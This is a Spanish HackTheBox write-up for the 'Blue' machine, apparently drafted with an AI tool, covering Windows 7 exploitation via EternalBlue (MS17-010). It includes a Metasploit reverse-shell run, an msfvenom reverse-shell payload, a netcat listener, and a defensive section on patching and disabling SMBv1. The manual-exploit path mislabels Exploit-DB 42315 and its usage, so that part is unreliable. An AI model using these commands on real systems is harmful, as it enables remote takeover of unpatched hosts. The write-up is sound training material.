---
title: Blue (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, windows, smb, eternalblue, ms17-010, cve-2017-0144, metasploit]
type: nota
status: en-progreso
source: claude-code
aliases: [HTB Blue, Blue HTB, EternalBlue HTB]
---

# Blue — HackTheBox (Easy)

SO: Windows 7 · Dificultad: Easy · Skills: nmap, enumeracion SMB, EternalBlue (MS17-010), Metasploit / exploit manual

Blue es la maquina de referencia de HTB para aprender EternalBlue: un desbordamiento de buffer en el controlador SMBv1 de Windows que permite ejecucion remota de codigo directamente en modo kernel, entregando acceso SYSTEM sin necesidad de escalada. El camino completo es Recon → Foothold → SYSTEM (no hay escalada de privilegios separada porque el exploit ya corre en el contexto mas privilegiado).

> HTB es un laboratorio de ciberseguridad 100 % legal y autorizado. Practica etica, nunca apliques estas tecnicas fuera de entornos donde tengas permiso explicitico.

---

## Objetivo

Obtener `user.txt` y `root.txt` explotando la vulnerabilidad MS17-010 (CVE-2017-0144) sobre un Windows 7 sin parchear expuesto por SMB.

---

## Acceso a la maquina (paso previo)

1. Descarga tu perfil VPN desde HTB → `lab_<usuario>.ovpn`.
2. Conectate y deja la terminal abierta:
```bash
sudo openvpn lab_<usuario>.ovpn
```
3. En la web de HTB, lanza (Spawn) la maquina Blue. Te asignara una IP del rango `10.10.10.x`.
4. Comprueba conectividad:
```bash
ping -c2 <IP>
```
5. A partir de aqui, sustituye `<IP>` por la IP real que te toque (es dinamica).

> Las maquinas **retiradas** (como Blue) requieren suscripcion **VIP**. Las activas son gratuitas. Si usas el **Pwnbox** (Kali en el navegador) ya viene conectado a la VPN.

---

## Reconocimiento

**Categoria**: escaneo de puertos y deteccion de servicios/version.

Lanzamos nmap con deteccion de version (`-sV`), scripts por defecto (`-sC`) y guardamos resultados:

```bash
nmap -sC -sV -oN blue_nmap.txt <IP>
```

Resultado relevante (resumido):

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 SP1
...
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0144
```

El script `smb-vuln-ms17-010` (incluido en los scripts de nmap) confirma directamente que el host es vulnerable. Puerto 445 abierto + Windows 7 SP1 = superficie de ataque clara.

---

## Enumeracion

**Categoria**: enumeracion de SMB y confirmacion de version/parche.

Aunque nmap ya confirma la vulnerabilidad, podemos afinar con `nmap --script smb-vuln-ms17-010` de forma aislada:

```bash
nmap -p445 --script smb-vuln-ms17-010 <IP>
```

Tambien util para verificar si SMBv1 esta activo (sin esto EternalBlue no funciona):

```bash
nmap -p445 --script smb-protocols <IP>
```

Si el resultado muestra `SMBv1` en la lista de dialectos soportados, la maquina es explotable por esta via.

> En esta maquina no hay enumeracion adicional de usuarios ni shares necesaria: la vulnerabilidad da SYSTEM directamente sobre cualquier proceso SMB.

---

## Acceso inicial (foothold)

**Categoria**: RCE pre-autenticacion via desbordamiento de buffer en modo kernel (MS17-010 / CVE-2017-0144).

### Que hace EternalBlue

EternalBlue abusa de un error de calculo en el controlador `srv.sys` del kernel de Windows al procesar paquetes SMBv1 de tipo `SMB_COM_TRANSACTION2`. El atacante envia un paquete malformado que provoca un desbordamiento de buffer en el pool del kernel (non-paged pool), sobrescribiendo estructuras internas. Esto permite escribir y ejecutar shellcode directamente en modo kernel, sin autenticacion previa. El resultado es ejecucion de codigo con privilegios `NT AUTHORITY\SYSTEM`.

### Via 1: Metasploit (estandar)

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <TU_IP_VPN>    # ip de tu interfaz tun0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

Metasploit gestiona automaticamente: envio del exploit, instalacion del shellcode en el kernel, apertura de sesion Meterpreter. Si la sesion abre como `NT AUTHORITY\SYSTEM`, el foothold y la escalada son simultaneos.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Via 2: AutoBlue / exploit manual (exploit-db)

Existe un exploit manual en Python disponible en Exploit-DB (busqueda: `searchsploit ms17-010`). El flujo general:

```bash
searchsploit ms17-010
# Resultado: exploits/windows/remote/42315.py (entre otros)
searchsploit -m 42315
```

El script AutoBlue requiere:
1. Generar el shellcode con `msfvenom` o similar (reverse shell):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP_VPN> LPORT=4444 -f raw -o shellcode.bin
```
2. Poner un listener:
```bash
nc -lvnp 4444
```
3. Lanzar el exploit apuntando al target:
```bash
python3 42315.py <IP> shellcode.bin
```

> El exploit manual es educativamente valioso porque expone los pasos que Metasploit oculta: construccion del paquete SMB malformado, spray del heap del kernel, y escritura del shellcode. Verificar compatibilidad exacta del script con la version de Python y dependencias antes de ejecutar; puede necesitar ajustes menores.

---

## Escalada de privilegios

No aplica. EternalBlue entrega ejecucion directamente en contexto `NT AUTHORITY\SYSTEM` (modo kernel). No hay usuario intermedio ni escalada posterior necesaria.

---

## Flags

Con la sesion SYSTEM, navegar a las rutas de flags:

**user.txt** — ubicado en el escritorio del usuario no-privilegiado (tipicamente `haris` en esta maquina):

```bash
# Desde Meterpreter
cat C:\\Users\\haris\\Desktop\\user.txt
# Valor: <flag>
```

**root.txt** — ubicado en el escritorio del Administrador:

```bash
cat C:\\Users\\Administrator\\Desktop\\root.txt
# Valor: <flag>
```

Como ya somos SYSTEM podemos leer ambos sin restriccion.

---

## Patron y teoria

Esta es la seccion mas importante: Blue no es sobre encontrar la vulnerabilidad (nmap la grita), sino sobre entender **por que existe** y **como se diseña para evitarla**.

### Patron: RCE pre-auth en protocolo de red legacy sin sandboxing

| Capa | Detalle |
|---|---|
| Protocolo | SMBv1 (1992). Nunca fue disenado con seguridad moderna. |
| Vulnerabilidad | Desbordamiento de entero/buffer en `srv.sys` al parsear `TRANSACTION2` |
| Contexto de ejecucion | Modo kernel (ring 0). No hay sandbox, no hay usuario: es el OS. |
| Autenticacion requerida | Ninguna. El exploit ocurre antes de cualquier handshake de autenticacion. |
| Impacto | Control total del sistema operativo. |

**La raiz del problema es doble**: un bug de parseo en codigo de red legacy (que corre en kernel) + un sistema sin el parche MS17-010 aplicado. Cualquiera de las dos capas de defensa habria bloqueado el ataque.

### El salto respecto a Starting Point

En las maquinas de Starting Point el foothold suele dar acceso de usuario y luego hay una escalada separada (SUID, sudo misconfiguration, credenciales reutilizadas). En Blue **no hay cadena**: el exploit es tan severo que entrega el nivel mas alto directamente. Esto ilustra la diferencia entre una vulnerabilidad de aplicacion (user-land) y una vulnerabilidad de protocolo/kernel (ring 0).

### Como se defiende / como disenar para evitarlo (dev & purple team)

1. **Parchear** — MS17-010 salio en marzo 2017. WannaCry (mayo 2017) exploto a escala global esta misma vulnerabilidad en sistemas sin parchear. Regla: parchear criticos en <30 dias, o antes si hay exploit publico activo.
2. **Desactivar protocolos legacy** — SMBv1 deberia estar deshabilitado en cualquier sistema moderno. En Windows:
```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false
```
3. **Microsegmentacion / firewall perimetral** — el puerto 445 no deberia ser alcanzable desde Internet ni desde segmentos de red no confiables. Si un host no necesita recibir conexiones SMB entrantes, bloquear a nivel de firewall.
4. **Principio de minimo privilegio en servicios de red** — aunque no aplica directamente aqui (el bug es en el kernel), como patron general: los servicios que escuchan en red deberian correr con los minimos privilegios posibles. Un bug en un daemon que corre como usuario limitado tiene impacto reducido vs. uno que corre en kernel.
5. **Deteccion** — firmas IDS/IPS para trafico SMBv1 malformado. Logs de SMB con alertas sobre paquetes `TRANSACTION2` anomalos.

### CVE y exploit reference

- **CVE-2017-0144** — EternalBlue (MS17-010). CVSS 9.3 (critico).
- **CVE-2017-0145** — EternalRomance (mismo parche, protocolo ligeramente diferente).
- Exploit-DB: `42315` (AutoBlue), `42031`.
- Metasploit: `exploit/windows/smb/ms17_010_eternalblue`.
- Referencia historica: WannaCry y NotPetya usaron EternalBlue como vector inicial de propagacion lateral masiva.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[08-vulnerabilidades-y-explotacion]]
- [[03-seguridad-de-redes]]
